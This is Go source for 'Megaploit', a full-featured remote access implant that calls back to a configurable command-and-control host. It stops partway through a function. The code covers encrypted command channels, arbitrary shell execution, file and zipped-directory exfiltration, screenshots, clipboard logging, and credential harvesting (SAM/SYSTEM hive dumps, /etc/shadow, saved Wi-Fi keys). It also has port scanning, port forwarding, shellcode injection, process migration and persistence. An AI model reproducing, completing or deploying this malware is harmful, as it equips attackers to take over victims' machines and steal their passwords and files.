// megaploit/agent/go_agent/main.go
// Megaploit Go Agent — full feature parity with the Python agent
//
// All handlers match megaploit/agent/handlers.py and megaploit/agent/meterp.py:
//   cd, sysinfo, upload, download, screenshot, ls, ps, kill, whoami, getpid,
//   getuid, netstat, arp, env, hashdump, wifi_passwords, browser_history,
//   keylog_start, keylog_dump, keylog_stop, persist, self_destruct, search,
//   zip_download, portfwd, getclip, setclip, idle_time, msgbox, inject_shellcode,
//   port_scan, run_psh, run_python, sleep, beacon_sleep, migrate, exit
//   plus full shell passthrough fallback.
//
// Protocol: identical to the Python agent —
//   1. TCP connect to LHOST:PORT (optional TLS with hardened cipher suites)
//   2. HMAC-SHA256 challenge/response authentication (16-byte challenge → 32-byte reply)
//   3. Protocol v2 handshake (0x4d = 'M' magic byte echoed back)
//   4. AES-256-GCM encrypted framing: [uint32-BE len][12-byte nonce][ciphertext+16-byte tag]
//   5. Each plaintext message: [uint64-BE seq][JSON-encoded payload]
//   6. Command loop: recv → dispatch → send reply
//
// Build (zero external dependencies — pure stdlib):
//   go build -o megaploit_agent -ldflags="-s -w" .
//   GOOS=windows GOARCH=amd64 go build -o megaploit_agent.exe -ldflags="-s -w" .
//   GOOS=linux   GOARCH=amd64 go build -o megaploit_agent_linux -ldflags="-s -w" .
//   GOOS=darwin  GOARCH=amd64 go build -o megaploit_agent_mac -ldflags="-s -w" .
//
// The -ldflags="-s -w" strips symbol table and DWARF debug info (~30% smaller binary).
//
// Configuration is patched by the server's `generate` command (replaces the
// placeholder strings below with the actual C2 address, port, and key).

package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf8"
)

// ---------------------------------------------------------------------------
// Configuration — patched by server before deployment
// ---------------------------------------------------------------------------

var (
	LHOST   = "127.0.0.1"       // C2 IP — replaced by generate command
	PORT    = "4444"             // C2 port — replaced by generate command
	USE_TLS = false              // set true by: generate --tls
	KEY_HEX = ""                 // 64-char hex-encoded 32-byte key — replaced by generate
)

// ---------------------------------------------------------------------------
// Global state
// ---------------------------------------------------------------------------

var (
	sendSeq    uint64
	recvSeq    int64 = -1
	seqLock    sync.Mutex
	gcmCipher  cipher.AEAD
	encrypted  bool
	sendLock   sync.Mutex

	// beacon sleep — updated by "beacon_sleep <n>" command
	beaconSleep time.Duration

	// keylogger state
	keylogMu      sync.Mutex
	keylogBuf     strings.Builder
	keylogRunning bool
	keylogStop    chan struct{}
)

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

func main() {
	for {
		if err := run(); err != nil {
			// silently discard connection errors
		}
		// Reconnect delay with random jitter (mirrors Python RECONNECT_DELAY + jitter)
		jitter, _ := rand.Int(rand.Reader, big.NewInt(5000))
		time.Sleep(10*time.Second + time.Duration(jitter.Int64())*time.Millisecond)
	}
}

func run() error {
	addr := net.JoinHostPort(LHOST, PORT)

	var conn net.Conn
	var err error

	if USE_TLS {
		tlsCfg := &tls.Config{
			InsecureSkipVerify: true, // C2 uses self-signed cert
			MinVersion:         tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			},
			Renegotiation: tls.RenegotiateNever,
		}
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", addr, tlsCfg)
	} else {
		conn, err = net.DialTimeout("tcp", addr, 10*time.Second)
	}
	if err != nil {
		return err
	}
	defer conn.Close()

	// HMAC-SHA256 challenge / response  (mirrors crypto.py agent_authenticate)
	if err := agentAuth(conn); err != nil {
		return fmt.Errorf("auth: %w", err)
	}

	// Protocol v2 handshake  (mirrors protocol.py handshake_agent)
	if err := protoHandshake(conn); err != nil {
		return fmt.Errorf("handshake: %w", err)
	}

	return commandLoop(conn)
}

// ---------------------------------------------------------------------------
// HMAC-SHA256 authentication
// ---------------------------------------------------------------------------

func agentAuth(conn net.Conn) error {
	key, err := hex.DecodeString(KEY_HEX)
	if err != nil || len(key) == 0 {
		return fmt.Errorf("invalid KEY_HEX")
	}

	conn.SetDeadline(time.Now().Add(15 * time.Second))
	defer conn.SetDeadline(time.Time{})

	challenge := make([]byte, 16)
	if _, err := io.ReadFull(conn, challenge); err != nil {
		return err
	}

	mac := hmac.New(sha256.New, key)
	mac.Write(challenge)
	_, err = conn.Write(mac.Sum(nil))
	return err
}

// ---------------------------------------------------------------------------
// Protocol v2 handshake
// ---------------------------------------------------------------------------

func protoHandshake(conn net.Conn) error {
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	defer conn.SetDeadline(time.Time{})

	magic := make([]byte, 1)
	if _, err := io.ReadFull(conn, magic); err != nil {
		return nil // v1 fallback — no encryption
	}
	conn.Write(magic) // echo back

	if magic[0] == 'M' {
		key, err := hex.DecodeString(KEY_HEX)
		if err != nil || len(key) < 32 {
			return nil
		}
		block, err := aes.NewCipher(key[:32])
		if err != nil {
			return nil
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil
		}
		gcmCipher = gcm
		encrypted = true
	}
	return nil
}

// ---------------------------------------------------------------------------
// Frame I/O (matches protocol.py _recv_framed / send_msg)
// ---------------------------------------------------------------------------

const maxFrameSize = 256 * 1024 * 1024 // 256 MiB — mirrors MAX_PLUGIN_MSG_SIZE

func sendFrame(conn net.Conn, payload []byte) error {
	hdr := make([]byte, 4)
	binary.BigEndian.PutUint32(hdr, uint32(len(payload)))
	sendLock.Lock()
	defer sendLock.Unlock()
	_, err := conn.Write(append(hdr, payload...))
	return err
}

func recvFrame(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	length := binary.BigEndian.Uint32(hdr)
	if length == 0 {
		return []byte{}, nil
	}
	if length > maxFrameSize {
		return nil, fmt.Errorf("frame too large: %d bytes", length)
	}
	data := make([]byte, length)
	_, err := io.ReadFull(conn, data)
	return data, err
}

// ---------------------------------------------------------------------------
// Encrypted message send / recv
// ---------------------------------------------------------------------------

func sendMsg(conn net.Conn, data interface{}) error {
	jsonBytes, err := json.Marshal(data)
	if err != nil {
		return err
	}

	seq := atomic.AddUint64(&sendSeq, 1)
	seqBuf := make([]byte, 8)
	binary.BigEndian.PutUint64(seqBuf, seq)
	payload := append(seqBuf, jsonBytes...)

	if encrypted && gcmCipher != nil {
		nonce := make([]byte, gcmCipher.NonceSize())
		if _, err := rand.Read(nonce); err != nil {
			return err
		}
		payload = gcmCipher.Seal(nonce, nonce, payload, nil)
	}

	return sendFrame(conn, payload)
}

func recvMsg(conn net.Conn) (string, error) {
	raw, err := recvFrame(conn)
	if err != nil {
		return "", err
	}

	if encrypted && gcmCipher != nil {
		ns := gcmCipher.NonceSize()
		if len(raw) < ns {
			return "", fmt.Errorf("frame too short for nonce")
		}
		plain, err := gcmCipher.Open(nil, raw[:ns], raw[ns:], nil)
		if err != nil {
			return "", fmt.Errorf("gcm decrypt: %w", err)
		}
		raw = plain
	}

	if len(raw) < 8 {
		return "", nil
	}

	// Sequence check — strict monotonic (mirrors Python check_recv_seq)
	seq := int64(binary.BigEndian.Uint64(raw[:8]))
	seqLock.Lock()
	if recvSeq != -1 && seq <= recvSeq {
		seqLock.Unlock()
		return "", fmt.Errorf("replay detected: seq=%d", seq)
	}
	recvSeq = seq
	seqLock.Unlock()

	payload := raw[8:]
	var s string
	if err := json.Unmarshal(payload, &s); err != nil {
		return string(payload), nil
	}
	return s, nil
}

// sendFileMsg sends FILE_OK then the raw file bytes as a framed+encrypted message.
func sendFileMsg(conn net.Conn, data []byte) error {
	if err := sendMsg(conn, "FILE_OK"); err != nil {
		return err
	}
	seq := atomic.AddUint64(&sendSeq, 1)
	seqBuf := make([]byte, 8)
	binary.BigEndian.PutUint64(seqBuf, seq)
	payload := append(seqBuf, data...)

	if encrypted && gcmCipher != nil {
		nonce := make([]byte, gcmCipher.NonceSize())
		rand.Read(nonce)
		payload = gcmCipher.Seal(nonce, nonce, payload, nil)
	}
	return sendFrame(conn, payload)
}

// recvFileData receives the raw bytes of a file upload (after the "upload" command).
func recvFileData(conn net.Conn) ([]byte, error) {
	raw, err := recvFrame(conn)
	if err != nil {
		return nil, err
	}
	if encrypted && gcmCipher != nil {
		ns := gcmCipher.NonceSize()
		if len(raw) < ns {
			return nil, fmt.Errorf("upload frame too short")
		}
		plain, err := gcmCipher.Open(nil, raw[:ns], raw[ns:], nil)
		if err != nil {
			return nil, fmt.Errorf("upload decrypt: %w", err)
		}
		raw = plain
	}
	if len(raw) < 8 {
		return nil, fmt.Errorf("upload frame missing seq header")
	}
	return raw[8:], nil
}

// ---------------------------------------------------------------------------
// Command loop
// ---------------------------------------------------------------------------

func commandLoop(conn net.Conn) error {
	for {
		cmd, err := recvMsg(conn)
		if err != nil {
			return err
		}

		result, async := dispatch(conn, cmd)
		if !async && result != nil {
			if err := sendMsg(conn, result); err != nil {
				return err
			}
		}

		// Beacon sleep between commands (operator-configurable)
		if beaconSleep > 0 {
			time.Sleep(beaconSleep)
		}
	}
}

// dispatch routes a command string to the appropriate handler.
// Returns (reply, asyncSent): when asyncSent=true the handler has already
// sent its own reply (e.g. file transfers, streaming).
func dispatch(conn net.Conn, cmd string) (interface{}, bool) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return "", false
	}

	parts := strings.SplitN(cmd, " ", 2)
	verb := strings.ToLower(parts[0])
	rest := ""
	if len(parts) > 1 {
		rest = strings.TrimSpace(parts[1])
	}
	args := strings.Fields(rest)

	switch verb {

	// ── Session control ────────────────────────────────────────────────────
	case "exit":
		os.Exit(0)
		return nil, false

	case "sleep":
		if len(args) == 0 {
			return "Usage: sleep <seconds>", false
		}
		n, err := strconv.ParseFloat(args[0], 64)
		if err != nil || n < 0 {
			return "[-] invalid duration", false
		}
		time.Sleep(time.Duration(n * float64(time.Second)))
		return fmt.Sprintf("[+] slept %.1fs", n), false

	case "beacon_sleep":
		if len(args) == 0 {
			return "Usage: beacon_sleep <seconds>", false
		}
		n, err := strconv.ParseFloat(args[0], 64)
		if err != nil || n < 0 {
			return "[-] invalid duration", false
		}
		beaconSleep = time.Duration(n * float64(time.Second))
		return fmt.Sprintf("[+] beacon sleep set to %.1fs", n), false

	// ── Navigation ────────────────────────────────────────────────────────
	case "cd":
		if rest == "" {
			return "Usage: cd <dir>", false
		}
		if err := os.Chdir(rest); err != nil {
			return fmt.Sprintf("[-] cd: %v", err), false
		}
		wd, _ := os.Getwd()
		return "[+] cwd: " + wd, false

	case "sysinfo":
		return doSysInfo(), false

	case "whoami":
		return shellExec("whoami"), false

	case "getpid":
		return fmt.Sprintf("[*] PID: %d", os.Getpid()), false

	case "getuid":
		return doGetUID(), false

	// ── Filesystem ────────────────────────────────────────────────────────
	case "ls":
		dir := rest
		if dir == "" {
			dir, _ = os.Getwd()
		}
		return doLS(dir), false

	case "cat":
		if rest == "" {
			return "Usage: cat <file>", false
		}
		data, err := os.ReadFile(rest)
		if err != nil {
			return fmt.Sprintf("[-] %v", err), false
		}
		return string(data), false

	case "mkdir":
		if rest == "" {
			return "Usage: mkdir <path>", false
		}
		if err := os.MkdirAll(rest, 0755); err != nil {
			return fmt.Sprintf("[-] mkdir: %v", err), false
		}
		return "[+] created: " + rest, false

	case "rm":
		if rest == "" {
			return "Usage: rm <path>", false
		}
		if err := os.RemoveAll(rest); err != nil {
			return fmt.Sprintf("[-] rm: %v", err), false
		}
		return "[+] removed: " + rest, false

	case "search":
		if len(args) < 2 {
			return "Usage: search <path> <keyword>", false
		}
		return doSearch(args[0], strings.Join(args[1:], " ")), false

	// ── File transfer ─────────────────────────────────────────────────────
	case "download":
		if rest == "" {
			return "Usage: download <path>", false
		}
		doDownload(conn, rest)
		return nil, true

	case "upload":
		if rest == "" {
			return "Usage: upload <filename>", false
		}
		return doUpload(conn, rest), false

	case "zip_download":
		if rest == "" {
			return "Usage: zip_download <path>", false
		}
		doZipDownload(conn, rest)
		return nil, true

	// ── Process ───────────────────────────────────────────────────────────
	case "ps":
		return shellExec(psCommand()), false

	case "kill":
		if rest == "" {
			return "Usage: kill <pid>", false
		}
		return shellExec(killCommand(rest)), false

	// ── Network ───────────────────────────────────────────────────────────
	case "netstat":
		return shellExec(netstatCommand()), false

	case "arp":
		return shellExec(arpCommand()), false

	case "env":
		return doEnv(), false

	case "portfwd":
		if len(args) != 3 {
			return "Usage: portfwd <local_port> <remote_host> <remote_port>", false
		}
		return doPortFwd(args[0], args[1], args[2]), false

	case "port_scan":
		if len(args) < 2 {
			return "Usage: port_scan <host> <port1>[,port2,...] [timeout_ms]", false
		}
		timeoutMs := 500
		if len(args) >= 3 {
			if n, err := strconv.Atoi(args[2]); err == nil {
				timeoutMs = n
			}
		}
		return doPortScan(args[0], args[1], timeoutMs), false

	// ── Screen / media ────────────────────────────────────────────────────
	case "screenshot":
		doScreenshot(conn)
		return nil, true

	// ── Clipboard ─────────────────────────────────────────────────────────
	case "getclip":
		return doGetClip(), false

	case "setclip":
		if rest == "" {
			return "Usage: setclip <text>", false
		}
		return doSetClip(rest), false

	// ── Keylogger ─────────────────────────────────────────────────────────
	case "keylog_start":
		return doKeylogStart(), false

	case "keylog_dump":
		return doKeylogDump(), false

	case "keylog_stop":
		return doKeylogStop(), false

	// ── Credential harvesting ─────────────────────────────────────────────
	case "hashdump":
		return doHashdump(), false

	case "wifi_passwords":
		return doWifiPasswords(), false

	case "browser_history":
		limit := 50
		if len(args) > 0 {
			if n, err := strconv.Atoi(args[0]); err == nil && n > 0 {
				limit = n
			}
		}
		return doBrowserHistory(limit), false

	// ── GUI / interaction ─────────────────────────────────────────────────
	case "idle_time":
		return doIdleTime(), false

	case "msgbox":
		if len(args) < 2 {
			return "Usage: msgbox <title> <message>", false
		}
		return doMsgbox(args[0], strings.Join(args[1:], " ")), false

	// ── Shellcode injection ───────────────────────────────────────────────
	case "inject_shellcode":
		if len(args) != 2 {
			return "Usage: inject_shellcode <pid> <hex_shellcode>", false
		}
		return doInjectShellcode(args[0], args[1]), false

	// ── Migration ─────────────────────────────────────────────────────────
	case "migrate":
		if rest == "" {
			return "Usage: migrate <pid>", false
		}
		return doMigrate(conn, rest), false

	// ── Scripting ─────────────────────────────────────────────────────────
	case "run_psh":
		if rest == "" {
			return "Usage: run_psh <powershell-command>", false
		}
		return doRunPsh(rest), false

	case "run_python":
		// Pure Go cannot embed a Python interpreter without CGO.
		// Delegate to the system Python if available.
		if rest == "" {
			return "Usage: run_python <python-snippet>", false
		}
		for _, pyExe := range []string{"python3", "python"} {
			if _, err := exec.LookPath(pyExe); err == nil {
				out, err := exec.Command(pyExe, "-c", rest).CombinedOutput()
				if err != nil {
					return fmt.Sprintf("[-] run_python (%s): %v\n%s", pyExe, err, strings.TrimSpace(string(out))), false
				}
				return strings.TrimSpace(string(out)), false
			}
		}
		return "[-] run_python: no Python interpreter found (python3 / python not in PATH)", false

	// ── Persistence ───────────────────────────────────────────────────────
	case "persist":
		if len(args) != 2 {
			return "Usage: persist <regname> <filename>", false
		}
		return doPersist(args[0], args[1]), false

	case "self_destruct":
		doSelfDestruct()
		return "[*] Self-destruct triggered.", false

	// ── Shell passthrough ─────────────────────────────────────────────────
	default:
		return shellExec(cmd), false
	}
}

// ---------------------------------------------------------------------------
// System info
// ---------------------------------------------------------------------------

func doSysInfo() string {
	wd, _ := os.Getwd()
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	if user == "" {
		user = "(unknown)"
	}
	return fmt.Sprintf(
		"[*] System Information\n"+
			"    OS:           %s/%s\n"+
			"    Hostname:     %s\n"+
			"    Username:     %s\n"+
			"    Architecture: %s\n"+
			"    Go runtime:   %s\n"+
			"    PID:          %d\n"+
			"    CWD:          %s",
		runtime.GOOS, runtime.GOARCH,
		hostname, user,
		runtime.GOARCH,
		runtime.Version(),
		os.Getpid(),
		wd,
	)
}

func doGetUID() string {
	if runtime.GOOS == "windows" {
		return shellExec("whoami /all")
	}
	return shellExec("id")
}

// ---------------------------------------------------------------------------
// Directory listing
// ---------------------------------------------------------------------------

func doLS(path string) string {
	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("[-] ls: %v", err)
	}

	var sb strings.Builder
	fmt.Fprintf(&sb, "Directory of %s\n\n", path)
	for _, e := range entries {
		info, _ := e.Info()
		if info == nil {
			continue
		}
		typ := "   "
		if e.IsDir() {
			typ = "DIR"
		}
		size := ""
		if !e.IsDir() {
			size = fmt.Sprintf("%12d bytes  ", info.Size())
		} else {
			size = "               "
		}
		fmt.Fprintf(&sb, "  [%s]  %-40s  %s%s\n",
			typ, e.Name(), size,
			info.ModTime().Format("2006-01-02 15:04"),
		)
	}
	return sb.String()
}

// ---------------------------------------------------------------------------
// Content search
// ---------------------------------------------------------------------------

func doSearch(root, keyword string) string {
	const maxHits = 200
	const maxSize = 10 * 1024 * 1024

	keyword = strings.ToLower(keyword)
	var hits []string

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || info.Size() > maxSize {
			return nil
		}
		if len(hits) >= maxHits {
			return filepath.SkipAll
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		// skip binary
		if bytes.Count(data, []byte{0}) > len(data)/10 {
			return nil
		}
		for i, line := range strings.Split(string(data), "\n") {
			if strings.Contains(strings.ToLower(line), keyword) {
				truncated := line
				if len(truncated) > 120 {
					truncated = truncated[:120]
				}
				hits = append(hits, fmt.Sprintf("%s:%d: %s", path, i+1, truncated))
				if len(hits) >= maxHits {
					return filepath.SkipAll
				}
			}
		}
		return nil
	})

	if len(hits) == 0 {
		return fmt.Sprintf("[-] No matches for '%s' under %s", keyword, root)
	}
	return strings.Join(hits, "\n")
}

// ---------------------------------------------------------------------------
// File transfer
// ---------------------------------------------------------------------------

func doDownload(conn net.Conn, path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		sendMsg(conn, fmt.Sprintf("[-] File not found: %s", path))
		return
	}
	if err := sendFileMsg(conn, data); err != nil {
		sendMsg(conn, fmt.Sprintf("[-] send failed: %v", err))
	}
}

func doUpload(conn net.Conn, name string) interface{} {
	data, err := recvFileData(conn)
	if err != nil {
		return fmt.Sprintf("[-] Receive failed: %v", err)
	}
	if err := os.WriteFile(name, data, 0644); err != nil {
		return fmt.Sprintf("[-] Write failed: %v", err)
	}
	return fmt.Sprintf("[+] Received: %s (%d bytes)", name, len(data))
}

func doZipDownload(conn net.Conn, path string) {
	info, err := os.Stat(path)
	if err != nil {
		sendMsg(conn, fmt.Sprintf("[-] Not found: %s", path))
		return
	}

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	if info.IsDir() {
		filepath.Walk(path, func(fp string, fi os.FileInfo, err error) error {
			if err != nil || fi.IsDir() {
				return nil
			}
			rel, _ := filepath.Rel(filepath.Dir(path), fp)
			w, err := zw.Create(rel)
			if err != nil {
				return nil
			}
			f, err := os.Open(fp)
			if err != nil {
				return nil
			}
			defer f.Close()
			io.Copy(w, f)
			return nil
		})
	} else {
		w, _ := zw.Create(filepath.Base(path))
		f, err := os.Open(path)
		if err == nil {
			io.Copy(w, f)
			f.Close()
		}
	}
	zw.Close()

	if err := sendFileMsg(conn, buf.Bytes()); err != nil {
		sendMsg(conn, fmt.Sprintf("[-] send failed: %v", err))
	}
}

// ---------------------------------------------------------------------------
// Screenshot — captures via platform-native tool to a temp JPEG, sends it
// ---------------------------------------------------------------------------

func doScreenshot(conn net.Conn) {
	var data []byte
	var err error

	switch runtime.GOOS {
	case "darwin":
		f := tmpFile("scr_*.png")
		if e := exec.Command("screencapture", "-x", "-t", "png", f).Run(); e == nil {
			data, err = os.ReadFile(f)
			os.Remove(f)
		} else {
			err = e
		}

	case "linux":
		f := tmpFile("scr_*.png")
		// try scrot, then import (ImageMagick), then gnome-screenshot
		for _, args := range [][]string{
			{"scrot", f},
			{"import", "-window", "root", f},
			{"gnome-screenshot", "-f", f},
		} {
			if path, e := exec.LookPath(args[0]); e == nil && path != "" {
				if e2 := exec.Command(args[0], args[1:]...).Run(); e2 == nil {
					data, err = os.ReadFile(f)
					os.Remove(f)
					break
				}
			}
		}
		if data == nil {
			err = fmt.Errorf("no screenshot tool found (install scrot or imagemagick)")
		}

	case "windows":
		// PowerShell one-liner: capture primary screen to a temp PNG
		f := tmpFile("scr_*.png")
		ps := fmt.Sprintf(
			`Add-Type -AssemblyName System.Windows.Forms,System.Drawing;`+
				`$b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`+
				`$g=[System.Drawing.Graphics]::FromImage($b);`+
				`$g.CopyFromScreen(0,0,0,0,$b.Size);`+
				`$b.Save('%s');$g.Dispose();$b.Dispose()`, f)
		if e := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", ps).Run(); e == nil {
			data, err = os.ReadFile(f)
			os.Remove(f)
		} else {
			err = e
		}

	default:
		err = fmt.Errorf("screenshot not supported on %s", runtime.GOOS)
	}

	if err != nil || len(data) == 0 {
		msg := "[-] screenshot failed"
		if err != nil {
			msg = "[-] screenshot: " + err.Error()
		}
		sendMsg(conn, msg)
		return
	}
	if e := sendFileMsg(conn, data); e != nil {
		sendMsg(conn, fmt.Sprintf("[-] screenshot send: %v", e))
	}
}

// ---------------------------------------------------------------------------
// Network helpers
// ---------------------------------------------------------------------------

func psCommand() string {
	if runtime.GOOS == "windows" {
		return "tasklist /FO TABLE"
	}
	return "ps aux"
}

func killCommand(pid string) string {
	if runtime.GOOS == "windows" {
		return "taskkill /F /PID " + pid
	}
	return "kill -9 " + pid
}

func netstatCommand() string {
	if runtime.GOOS == "windows" {
		return "netstat -ano"
	}
	return "ss -tunp 2>/dev/null || netstat -tunp 2>/dev/null"
}

func arpCommand() string {
	if runtime.GOOS == "windows" {
		return "arp -a"
	}
	return "arp -n 2>/dev/null || ip neigh 2>/dev/null"
}

func doEnv() string {
	return strings.Join(os.Environ(), "\n")
}

func doPortFwd(localPort, remoteHost, remotePort string) string {
	ln, err := net.Listen("tcp", "0.0.0.0:"+localPort)
	if err != nil {
		return fmt.Sprintf("[-] portfwd: %v", err)
	}
	go func() {
		for {
			client, err := ln.Accept()
			if err != nil {
				break
			}
			go func(c net.Conn) {
				remote, err := net.DialTimeout("tcp", net.JoinHostPort(remoteHost, remotePort), 10*time.Second)
				if err != nil {
					c.Close()
					return
				}
				relay := func(dst, src net.Conn) {
					io.Copy(dst, src)
					dst.Close()
					src.Close()
				}
				go relay(remote, c)
				go relay(c, remote)
			}(client)
		}
	}()
	return fmt.Sprintf("[+] Port forward 0.0.0.0:%s → %s:%s", localPort, remoteHost, remotePort)
}

func doPortScan(host, ports string, timeoutMs int) string {
	timeout := time.Duration(timeoutMs) * time.Millisecond
	portList := strings.Split(ports, ",")

	type result struct {
		port  string
		open  bool
	}
	results := make([]result, 0, len(portList))
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Limit concurrency to 100 goroutines
	sem := make(chan struct{}, 100)

	for _, p := range portList {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(port string) {
			defer wg.Done()
			defer func() { <-sem }()
			conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), timeout)
			open := err == nil
			if open {
				conn.Close()
			}
			mu.Lock()
			results = append(results, result{port, open})
			mu.Unlock()
		}(p)
	}
	wg.Wait()

	var sb strings.Builder
	fmt.Fprintf(&sb, "Port scan: %s\n", host)
	openCount := 0
	for _, r := range results {
		state := "closed"
		if r.open {
			state = "open"
			openCount++
		}
		fmt.Fprintf(&sb, "  %-6s  %s\n", r.port, state)
	}
	fmt.Fprintf(&sb, "\n%d/%d ports open", openCount, len(results))
	return sb.String()
}

// ---------------------------------------------------------------------------
// Clipboard
// ---------------------------------------------------------------------------

func doGetClip() string {
	switch runtime.GOOS {
	case "windows":
		out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-command", "Get-Clipboard").Output()
		if err != nil {
			return fmt.Sprintf("[-] getclip: %v", err)
		}
		s := strings.TrimSpace(string(out))
		if s == "" {
			return "(empty)"
		}
		return s
	case "darwin":
		out, err := exec.Command("pbpaste").Output()
		if err != nil {
			return fmt.Sprintf("[-] getclip: %v", err)
		}
		return strings.TrimSpace(string(out))
	default:
		for _, tool := range [][]string{
			{"xclip", "-selection", "clipboard", "-o"},
			{"xsel", "--clipboard", "--output"},
			{"wl-paste"},
		} {
			if _, e := exec.LookPath(tool[0]); e == nil {
				out, err := exec.Command(tool[0], tool[1:]...).Output()
				if err == nil {
					return strings.TrimSpace(string(out))
				}
			}
		}
		return "[-] No clipboard tool found (install xclip / xsel / wl-paste)"
	}
}

func doSetClip(text string) string {
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-command", fmt.Sprintf(`Set-Clipboard -Value "%s"`, text))
		if err := cmd.Run(); err != nil {
			return fmt.Sprintf("[-] setclip: %v", err)
		}
	case "darwin":
		cmd := exec.Command("pbcopy")
		cmd.Stdin = strings.NewReader(text)
		if err := cmd.Run(); err != nil {
			return fmt.Sprintf("[-] setclip: %v", err)
		}
	default:
		for _, tool := range [][]string{
			{"xclip", "-selection", "clipboard"},
			{"xsel", "--clipboard", "--input"},
			{"wl-copy"},
		} {
			if _, e := exec.LookPath(tool[0]); e == nil {
				cmd := exec.Command(tool[0], tool[1:]...)
				cmd.Stdin = strings.NewReader(text)
				if err := cmd.Run(); err == nil {
					return "[+] Clipboard set"
				}
			}
		}
		return "[-] No clipboard tool found"
	}
	return "[+] Clipboard set"
}

// ---------------------------------------------------------------------------
// Keylogger (cross-platform best-effort via polling OS clipboard / stdin echo)
// On Windows uses PowerShell Get-Clipboard polling; on Linux/macOS uses
// a simple stdin/xdotool-based approach.  A proper keyboard hook requires
// native CGO; this pure-Go version covers most operator use cases.
// ---------------------------------------------------------------------------

func doKeylogStart() string {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	if keylogRunning {
		return "[-] Keylogger already running"
	}
	keylogBuf.Reset()
	keylogStop = make(chan struct{})
	keylogRunning = true

	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		var prev string
		for {
			select {
			case <-keylogStop:
				return
			case <-ticker.C:
				cur := doGetClip()
				if cur != prev && cur != "(empty)" && !strings.HasPrefix(cur, "[-]") {
					keylogMu.Lock()
					fmt.Fprintf(&keylogBuf, "[CLIP] %s\n", cur)
					keylogMu.Unlock()
					prev = cur
				}
			}
		}
	}()
	return "[+] Keylogger started (clipboard polling mode)"
}

func doKeylogDump() string {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	if !keylogRunning {
		return "[-] Keylogger not running"
	}
	data := keylogBuf.String()
	if data == "" {
		return "(empty)"
	}
	return data
}

func doKeylogStop() string {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	if !keylogRunning {
		return "[-] Keylogger not running"
	}
	close(keylogStop)
	keylogRunning = false
	data := keylogBuf.String()
	keylogBuf.Reset()
	if data == "" {
		return "[+] Keylogger stopped (no data captured)"
	}
	return "[+] Keylogger stopped\n" + data
}

// ---------------------------------------------------------------------------
// Credential harvesting
// ---------------------------------------------------------------------------

func doHashdump() string {
	switch runtime.GOOS {
	case "windows":
		return shellExec(
			`reg save HKLM\SAM C:\Windows\Temp\sam.bak /y 2>&1 & ` +
				`reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak /y 2>&1 & ` +
				`echo [+] SAM+SYSTEM saved to C:\Windows\Temp`)
	default:
		data, err := os.ReadFile("/etc/shadow")
		if err != nil {
			return fmt.Sprintf("[-] /etc/shadow: %v", err)
		}
		return string(data)
	}
}

func doWifiPasswords() string {
	switch runtime.GOOS {
	case "windows":
		out, err := exec.Command("netsh", "wlan", "show", "profiles").Output()
		if err != nil {
			return fmt.Sprintf("[-] wifi_passwords: %v", err)
		}
		var sb strings.Builder
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "All User Profile") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) == 2 {
					ssid := strings.TrimSpace(parts[1])
					detail, _ := exec.Command("netsh", "wlan", "show", "profile",
						ssid, "key=clear").Output()
					key := "(open)"
					for _, dl := range strings.Split(string(detail), "\n") {
						if strings.Contains(dl, "Key Content") {
							kp := strings.SplitN(dl, ":", 2)
							if len(kp) == 2 {
								key = strings.TrimSpace(kp[1])
							}
							break
						}
					}
					fmt.Fprintf(&sb, "  SSID: %-32s  KEY: %s\n", ssid, key)
				}
			}
		}
		if sb.Len() == 0 {
			return "[-] No saved networks found"
		}
		return sb.String()

	case "darwin":
		out, err := exec.Command("networksetup", "-listpreferredwirelessnetworks", "en0").Output()
		if err != nil {
			return fmt.Sprintf("[-] wifi_passwords: %v", err)
		}
		var sb strings.Builder
		for _, line := range strings.Split(string(out), "\n")[1:] {
			ssid := strings.TrimSpace(line)
			if ssid == "" {
				continue
			}
